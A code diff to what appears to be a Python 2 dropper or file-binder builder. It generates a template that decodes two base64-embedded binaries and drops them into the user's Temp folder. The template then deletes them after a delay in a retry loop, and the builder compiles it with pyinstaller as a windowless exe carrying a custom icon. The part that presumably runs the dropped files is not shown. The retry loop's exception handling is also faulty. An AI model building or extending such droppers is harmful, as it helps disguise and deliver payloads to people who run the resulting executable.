@@ -28,9 +28,13 @@ import sys
 import time
 import base64
 
+def remove(file1, file2):
+	os.remove(file1)
+	os.remove(file2)
+
 def main():
-	file1Name = "%s"
-	file2Name = "%s"
+	file1Name   = os.path.expanduser("~")+"\\AppData\\Local\\Temp"+"\\\%s"
+	file2Name   = os.path.expanduser("~")+"\\AppData\\Local\\Temp"+"\\\%s"
 	file1binary = base64.b64decode("%s")
 	file2binary = base64.b64decode("%s")
 
@@ -49,8 +53,12 @@ def main():
 
 	time.sleep(3)
 
-	os.remove(file1Name)
-	os.remove(file2Name)
+	while True:
+		try:
+			remove(file1Name, file2Name)
+			break
+		except:
+			remove(file1Name, file2Name)
 
 if __name__ == "__main__":
 	if os.name == "nt":
@@ -75,11 +83,13 @@ def generateExec(pyName, iconName):
 	cmd = subprocess.Popen(['pyinstaller', "--onefile", '--noconsole',"--icon=%s"%(iconName), pyName], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 	stdout, nothing = cmd.communicate()
 
+	print stdout
+
 	file = "dist" + os.sep + pyName.split(".")[0]+".exe"
 	shutil.copy2(file, "..")
 
 	os.chdir("..")
-	shutil.rmtree("exec")
+	#shutil.rmtree("exec")
 
 	print "\n[+] Exe file ==> %s"%(os.getcwd()+os.sep+pyName.split(".")[0]+".exe")
 
